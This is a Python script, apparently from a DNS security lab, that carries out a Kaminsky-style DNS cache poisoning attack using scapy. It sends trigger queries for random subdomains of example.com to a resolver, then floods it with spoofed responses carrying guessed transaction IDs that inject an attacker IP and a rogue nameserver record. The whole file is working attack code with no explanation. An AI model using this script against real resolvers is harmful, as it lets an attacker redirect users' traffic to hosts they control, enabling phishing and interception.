from scapy.all import *
from random import choice, randint

def get_random_chars(amount):
    letters = 'abcdefghijklmnopqrstuvxwyz1234567890'
    return ''.join(choice(letters) for x in range(amount))

def generate_urls(amount):
    urls = []
    while amount > len(urls):
        url = get_random_chars(10)+".example.com"
        if url not in urls:
            urls.append(url)
    return urls

def generate_random_ids(no_of_ids):
    ids = []
    for i in range(0, no_of_ids):
        ids.append(randint(0, 65535))
    return ids

def generate_payloads(no_of_urls, no_of_ids, dstIP, srcIP, attackerIP):
    print(f"""Generating {amount}x{no_of_ids} payloads""")
    payloads = []
    for url in generate_urls(no_of_urls):
        queries = []
        triggerQuery = IP(dst=dstIP)/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=url)) 
        for random_id in generate_random_ids(no_of_ids):
            queries.append(
            IP(dst=dstIP, src=srcIP) /\
            UDP(dport=53) /\
            DNS(id=random_id, qr=1, aa=1, rd=0, ra=0, cd=0, opcode=0, rcode=0, \
                qd=DNSQR(qname=url, qtype="A", qclass="IN"), \
                an=DNSRR(rrname=url, type='A', ttl=3600, rdata=attackerIP), \
                ns=DNSRR(rrname='example.com', type='NS', ttl=999999999, rdata='ns.dnslabattacker.net'), \
                ar=DNSRR(rrname="ns.dnslabattacker.net", type='A', ttl=999999999, rdata=attackerIP)))
        payloads.append([triggerQuery, queries])
    print("Payloads generated.")
    return payloads

amount = 100
no_of_ids_per_payload = 100
s = conf.L3socket(iface='vnet0')
payloads = generate_payloads(amount, no_of_ids_per_payload, "192.168.122.230", "199.43.133.53", "192.168.122.138")
print("Starting payload dump.")
for x in payloads:
    s.send(x[0])
    for y in x[1]:
        s.send(y)
print("Finished.")